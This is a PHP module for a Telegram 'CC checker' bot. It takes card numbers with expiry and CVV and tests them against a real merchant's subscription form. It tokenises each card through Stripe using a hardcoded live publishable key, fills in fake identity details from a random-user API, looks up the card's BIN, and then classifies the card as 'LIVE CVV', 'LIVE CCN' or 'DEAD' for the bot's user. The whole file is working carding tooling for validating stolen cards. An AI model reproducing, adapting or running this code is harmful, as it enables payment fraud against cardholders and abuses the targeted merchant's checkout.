<?php
if((strpos($message, '/chk') === 0) or (strpos($message, '.chk') === 0)){
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

if (empty($message)){
    sendMessage($chatId, "<b>
Enter a valid cc to check, noob!
</b>",$message_id);
exit();
}
$lista = substr($message, 4);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$error = "<b>[⚠️]You're Fine?<i> Give me a valid CC❗</i></b>";
$cc1 = substr($cc, 0, 1);

if((is_numeric($cc)) & (is_numeric($mes)) & (is_numeric($ano))){
$arraycc = ['1', '2', '8', '9'];
if(in_array($cc1, $arraycc)){
        sendMessage($chatId, $error, $message_id);

    exit();
}if(empty($mes) or empty($ano) or empty($cvv)){
  sendMessage($chatId, $error, $message_id); 
  exit();
}
$starttime = microtime(true);
$mytime = 'time1';
if (strpos($message, '/chk@TainuxChk_bot') === 0){
    sendMessage($chatId, "<b>
Enter a valid cc to check, noob!
</b>",$message_id);
exit();
}
if (empty($cc)) {
sendMessage($chatId, "<b>
Stripe Charge 1$
STRING: <code>ccs/month/year/cvv</code>
</b>",$message_id);
exit();
}
$bin = substr($cc, 0, 6);
$last = substr($cc, 11, 5);
//prepaid
 /* $url = 'https://young-badlands-00017.herokuapp.com/?bin='.$cc.'';
$fim = json_decode(file_get_contents($url), true);
  $code = $fim["code"];
    if($level != 'true'){
    sendMessage($chatId,"<b>[⚠️]You're Fine?<i>Enter a valid CC ️</i></b>", $message_id);
    exit();
  }*/

$bin2 = strlen($lista);
if ($bin2 < 6){
sendMessage($chatId, "<b>
Enter a valid bin to check, noob!
</b>",$message_id);
exit();
}

$sss = sendMessage($chatId,"<b>
━━━━━━━━━━ Please Wait ━━━━━━━━━━
➥ CC : <code>$lista</code>
➥ Progress : {$mytime($starttime)}s □□□□□ 0%[⬛️]
<a href='tg://user?id=$userId'>$username</a> $Rank
➥ Bot by <i>$owner</i>

Checking..
</b>", $message_id);


//$update = file_get_contents($sss);
$respon = json_decode($sss, true);
$message_id2 = $update["message"]["message_id"]; 
$message_id2 = $message_id2 + 1;
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$namec = "$firstname $lastname";
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
  $namec = "$firstname+$lastname";
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
//==================[BIN LOOK-UP]======================//
$url = 'https://projectslost.xyz/bin/?bin='.$cc.'';
$fim = json_decode(file_get_contents($url), true);
$message = $fim["msg"];
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$prepaid = $fim["prepaid"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim["bank"]["name"];
$bankurl = $fim["bank"]["site"];
$bankphone = $fim["bank"]["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
$curl = curl_exec($ch);
/*$brand = strtoupper($brand);
$type = strtoupper($type);
$card = strtoupper($card);
$country = strtoupper($country);*/


  //==================[BIN LOOK-UP-END]======================//
edit_message($chatId,"<b>
━━━━━━━━━━ Please Wait ━━━━━━━━━━
➥ CC : <code>$lista</code>
➥ Progress : {$mytime($starttime)}s ■□□□□ 20%[🟥]
<a href='tg://user?id=$userId'>$username</a> $Rank
➥ Bot by <i>$owner</i>

Checking..
</b>",$message_id2);

  
  edit_message($chatId,"<b>
━━━━━━━━━━ Please Wait ━━━━━━━━━━
➥ CC : <code>$lista</code>
➥ Progress : {$mytime($starttime)}s ■■□□□ 40%[🟨]
<a href='tg://user?id=$userId'>$username</a> $Rank
➥ Bot by <i>$owner</i>

Checking..
</b>",$message_id2);

edit_message($chatId,"<b>
━━━━━━━━━━ Please Wait ━━━━━━━━━━
➥ CC : <code>$lista</code>
➥ Progress : {$mytime($starttime)}s ■■■□□ 60%[🟧]
<a href='tg://user?id=$userId'>$username</a> $Rank
➥ Bot by <i>$owner</i>

Checking..
</b>",$message_id2);

//=======================[1 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
   ));

# ----------------- [1 req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc8a3e3241%3B+stripe-js-v3%2Fc8a3e3241&time_on_page=270223&key=pk_live_hQJRYWUjPLlW7MCl6AD0P3Zl&_stripe_version=2020-08-27');
$result = curl_exec($ch);
$typecc = trim(strip_tags(GetStr($result,'"brand": "','"')));
$id = trim(strip_tags(GetStr($result,'"id": "','"')));
$id2 = trim(strip_tags(GetStr($result,'"id": "card_','"')));
$brandcc = trim(strip_tags(GetStr($result,'"brand": "','"')));
$debitor = trim(strip_tags(GetStr($result,'"funding": "','"')));
$ipclient = trim(strip_tags(GetStr($result,'"client_ip": "','"')));
$created = trim(strip_tags(GetStr($result,'"created": ',',')));
$livemod = trim(strip_tags(GetStr($result,'"livemode": ',',')));

//=======================[1 REQ-END]==============================//
  
edit_message($chatId,"<b>
━━━━━━━━━━ Please Wait ━━━━━━━━━━
➥ CC : <code>$lista</code>
➥ Progress : {$mytime($starttime)}s ■■■■□ 80%[🟧]
<a href='tg://user?id=$userId'>$username</a> $Rank
➥ Bot by <i>$owner</i>

Checking..
</b>",$message_id2);

//=======================[2 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://savage.love/wp-json/supportingcast/v1/payment_form');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: savage.love',
'method: POST',
'path: /wp-json/supportingcast/v1/payment_form',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.8',
'content-type: application/json',
'origin: https://savage.love',
'referer: https://savage.love/subscribe/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"action":"supportingcast_payment_form_join","_wp_http_referer":"/subscribe/","redirect_url":"/get-started","email":"'.$email.'","stripeToken":"'.$id.'","first_name":"","last_name":"","data":{"member_address__address1":"","member_address__address2":"","member_address__city":"","member_address__state":"","member_address__zip":"","member_address__country":""},"promo_code":"","g-recaptcha-response":"","plan_id":"6438","mode":"JOIN","sct_data":{}}');

 $result1 = curl_exec($ch);


//$message = trim(strip_tags(GetStr($result1,'<strong>','</strong><br />')));
$message = trim(strip_tags(GetStr($result1,'"card_message": "','"')));
$code = trim(strip_tags(GetStr($result1,'"decline_code": "','"')));
$payment = trim(strip_tags(GetStr($result1,'"last_payment_error": ',',')));

//"last_payment_error": null,

  //$idcustomer = trim(strip_tags(GetStr($resultcustomer,'"id":"','"')));

//=======================[CUSTOM REQ END]==================================//

//=======================[MADE BY]==============================//

$made = "<code>Brian Jago</code>";

//=======================[MADE BY]==============================//
 edit_message($chatId,"<b>
 ━━━━━━━━━━ Please Wait ━━━━━━━━━━
➥ CC : <code>$lista</code>
➥ Progress : {$mytime($starttime)}s ■■■■■ 100%[🟩]
<a href='tg://user?id=$userId'>$username</a> $Rank
➥ Bot by <i>$owner</i>

Checking..</b>",$message_id2);

//=======================[Responses]==============================//
# - [CVV Responses ] - #

if ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "incorrect_zip")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
$status08 = 'LIVE CVV';
$response08 = 'Thank You For Donation.';
$emojit = $emojil;
}
elseif (strpos($result, 'result":"success","redirect":')){
$status08 = 'LIVE CVV';
$response08 = 'Thank You For Donation.';
$emojit = $emojil;
}

elseif ((strpos($result, "Your card has insufficient funds.")) || (strpos($result, '"cvc_check": "fail"'))){
$status08 = 'LIVE CVV';
$response08 = 'Your card has insufficient funds.';
$emojit = $emojil;
}
# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result, 'security code is incorrect.')) || (strpos($result, "security code is invalid.")) || (strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc"))){
$status08 = 'LIVE CCN';
//$message = "Your card's security code is incorrect.";
$emojit = $emojil;
    
}

#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result, 'stolen_card')) || (strpos($result, "lost_card")) || (strpos($result, "pickup_card."))){
    $status08 = 'DEAD';
$response08 = 'Pickup or lost card';
$emojit = $emojid; 
    
}

# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
$status08 = 'DEAD';
$response08 = 'do_not_honor';
$emojit = $emojid; 
    
}
elseif (strpos($result1, 'Your card number is incorrect.')){
$status08 = 'DEAD';
//$message = 'The card number is incorrect.';
$emojit = $emojid; 
    
}
elseif (strpos($message, "Your card has expired.")){
$status08 = 'DEAD';
//$message = 'The card expiration month is invalid';
$emojit = $emojid; 
    
}
elseif (strpos($code, "invalid_account")){
$status08 = 'DEAD';
$message = 'Invalid account.';
$emojit = $emojid; 
    
}
  elseif (strpos($result1, "Your card's expiration month is invalid")){
$status08 = 'DEAD';
//$message = 'The card expiration month is invalid';
$emojit = $emojid; 
    
}
elseif (strpos($result1,  "Your card's expiration year is invalid.")) {
$status08 = 'DEAD';
//$message = 'Your card has expired.';
$emojit = $emojid; 
    
}

elseif (strpos($result, "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance.")) {
$status08 = 'DEAD';
$message = 'card_decline_rate_limit_exceeded';
$emojit = $emojid; 
    
}
//

elseif (strpos($result, "Your card does not support this type of purchase.")){
$status08 = 'DEAD';
$response08 = 'Generic decline.';
$emojit = $emojid; 
    
}
elseif (strpos($result, "Your card number is incorrect.")){
$status08 = 'DEAD';
//$message = 'Incorrect card number';
$emojit = $emojid; 
    
}


elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
    $status08 = 'DEAD';
$response08 = 'Your card was declined.';
$emojit = $emojid; 
    
}

elseif($payment == 'null'){
    $status08 = 'DEAD';
    $message = '3D lookup Enrolled';
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #


elseif(strpos($result1,  '-1')){
$status08 = 'DEAD';
//$message = 'Gateway or IP dead';
$emojit = $emojid; 
}
/*
else{
$status08 = 'DEAD';
$response08 = 'Unknown Error';
$emojit = $emojid;
    
}
else{
$status08 = 'DEAD';
$message = 'Gateway or IP dead2';
$emojit = $emojid; 
}*/
if($statuspro == 'DEAD'){
$status08 = 'DEAD';
$response08 = 'IP dead';
$emojit = $emojid; 
}
if($status08 == 'DEAD'){
$status08230 = "Declined [$emojid]";
}else{
$status08230 = "Approved! [$emojil]";
}

  $extra = str_pad(substr($cc, 0,12), 16, "x");

edit_message($chatId,
"<b>
[●] GATE : Stripe Charge $8 [●] </b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>CC -»</b> <code>$lista</code>
<b>Status -»</b> <code>$status08230</code>
<b>Reponse -»</b> <code>$message</code>
━━━━━━━━━[ Bin Info ]━━━━━━━━━
<b>Bin -»</b> <code>$bin [$emoji]</code>
<b>Country -»</b> <code>$country($pais) ~ $currency</code>
<b>Info -»</b> <code>$brand ~ $type ~ $level</code>
<b>Bank -»</b> <code>$bank</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Time -» <code>{$mytime($starttime)}s</code></b>
<b>User -» <a href='tg://user?id=$userId'>$username</a> $Rank</b>
<b>Bot by <code>$owner</code></b>",$message_id2); 


}
curl_close($ch);
ob_flush();
}else{
    sendMessage($chatId, $error, $message_id);
}
}



//• Proxy -» $statuspro $emojipro

////////CHK END COMMAND///////////


?>